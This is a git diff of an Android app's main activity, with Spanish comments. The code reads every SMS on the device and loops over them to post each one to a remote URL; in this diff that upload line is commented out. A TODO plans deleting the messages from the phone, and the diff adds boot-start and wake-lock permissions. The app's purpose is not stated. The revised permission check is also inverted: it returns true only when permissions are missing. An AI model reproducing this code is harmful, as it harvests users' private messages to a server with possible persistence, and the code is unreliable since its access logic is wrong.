@@ -26,36 +26,47 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        checkAccess();
+
         System.out.println("iniciando MAIN");
 
+        if (checkAccess())
+            ejecutaProcesos();
 
+    }
+
+    private void ejecutaProcesos() {
         msgSMS = new SMSUtils(getApplicationContext());
         ArrayList<SMS> msgs = msgSMS.readSMS();
         JSONUtils jUtil = new JSONUtils(getApplicationContext(), urlPost);
         System.out.println(msgs.size());
         for (int i = 0; i < msgs.size(); i++) {
-            jUtil.postMessage(msgs.get(i));
+            //jUtil.postMessage(msgs.get(i));//aqui envia sms por sms
             //System.out.println(msgs.get(i));
         }
         //TODO delete sms from mobil
 
     }
 
-    private void checkAccess() {
+    private boolean checkAccess() {
+        boolean access = false;
+
         int PERMISSION_ALL = 1;
         String[] PERMISSIONS = {
                 android.Manifest.permission.INTERNET,
                 android.Manifest.permission.VIBRATE,
                 Manifest.permission.READ_SMS,
                 Manifest.permission.SEND_SMS,
-                Manifest.permission.BROADCAST_SMS
+                Manifest.permission.BROADCAST_SMS,
+                Manifest.permission.RECEIVE_BOOT_COMPLETED,
+                Manifest.permission.WAKE_LOCK
 
 
         };
         if (!hasPermissions(this, PERMISSIONS)) {
             ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
+            access = true;
         }
+        return access;
     }
 
     public static boolean hasPermissions(Context context, String... permissions) {
